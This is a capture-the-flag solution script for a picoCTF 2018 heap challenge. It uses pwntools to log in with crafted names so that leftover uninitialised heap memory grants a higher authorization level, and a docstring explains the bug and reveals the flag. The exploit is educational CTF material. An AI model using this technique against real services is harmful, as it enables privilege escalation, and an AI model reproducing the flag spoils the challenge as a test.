from pwn import *

r = remote("2018shell3.picoctf.com", 33149)

def run_command(command):
    r.sendline(command)
    print(r.recv());
print(r.recv())

run_command("login " + "\x05"*9 + "\x00")
run_command("reset")
run_command("login " + "\x05"*9)
run_command("show")
run_command("get-flag")
print(r.recv())

"""
The vulnerability here lies in the fact that when a user is created, the memory lying underneath isn't zeroed out.
If we allocate a user with the name "hello", the memory looks somewhat like this:
[hello][1]
 name   auth

If we log in again with the name "hell", the memory will look something like this:
[hell][o]
 name   auth

Knowing this, we can create a user whose name contains "\x05", log out, then create new user with one less character in their name.
This will give us the authorization level that we desire

picoCTF{m3sS1nG_w1tH_tH3_h43p_28e2061f}
"""
